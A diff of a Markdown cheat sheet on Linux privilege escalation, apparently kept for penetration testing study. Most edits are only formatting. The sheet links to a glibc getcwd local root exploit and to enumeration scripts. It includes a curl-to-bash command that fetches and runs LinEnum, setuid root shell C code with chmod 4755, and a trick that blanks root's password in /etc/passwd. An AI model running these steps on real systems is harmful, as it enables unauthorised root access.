@@ -16,7 +16,7 @@
 
 ### Rational Love
 
-glibc - 'getcwd()' Local Privilege Escalation 2018 local root exploit
+glibc - 'getcwd()' Local Privilege Escalation 2018 local root exploit  
 [local-root-exploits/linux/CVE-2018-1000001 at master · 5H311-1NJ3C706/local-root-exploits · GitHub](https://github.com/5H311-1NJ3C706/local-root-exploits/tree/master/linux/CVE-2018-1000001)
 
 ## Tools
@@ -46,20 +46,22 @@ curl <local-ip>:<port>/LinEnum.sh | bash
 
 ### linux exploit suggester
 
-Linux privilege escalation auditing tool
+Linux privilege escalation auditing tool  
 [GitHub - mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
 
 ### linuxprivchecker.py
 
-A Linux Privilege Escalation Check Script
+A Linux Privilege Escalation Check Script  
 [GitHub - sleventyeleven/linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)
 
 ### Unix-privesc-check
+
 [unix-privesc-check | Penetration Testing Tools](https://tools.kali.org/vulnerability-analysis/unix-privesc-check)
 
 ## Manual information gathering
 
 ### Operating system
+
 ```bash
 cat /etc/*-release
 uname -i
@@ -84,8 +86,8 @@ grep -vE "nologin|false" /etc/passwd
 
 ### Groups
 
-Interesting unix groups
-`44(video)` <- has access to video output (weird stuff)
+Interesting unix groups  
+`44(video)` <- has access to video output (weird stuff)  
 `6(disk)` <- has raw access to the file system, read disk using e.g. `debugfs`
 
 ### Processing running
@@ -128,8 +130,8 @@ which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/de
 ```
 
 ## setuid
-Check if available
 
+Check if available  
 `mount` -> must **not** `nosuid`
 
 setuid.c
@@ -141,7 +143,7 @@ int main(void) {
 }
 ```
 
-alternative setuid.c
+Alternative setuid.c
 ```c
 int main(int argc, char *argv[]) {
     setreuid(0, 0);
@@ -155,12 +157,9 @@ chown root:root /tmp/setuid; chmod 4755 /tmp/setuid
 ```
 
 ## Writable /etc/passwd
-Change root, remove the "x" (password flag):
-
-`root:x:0:0:root:/root:/bin/bash` -> `root::0:0:root:/root:/bin/bash`
-
-`su`
-
+Change root, remove the "x" (password flag):  
+`root:x:0:0:root:/root:/bin/bash` -> `root::0:0:root:/root:/bin/bash`  
+`su`  
 -> root
 
 [linux - Privilege escalation using passwd file - Information Security Stack Exchange](https://security.stackexchange.com/a/170335/189482)
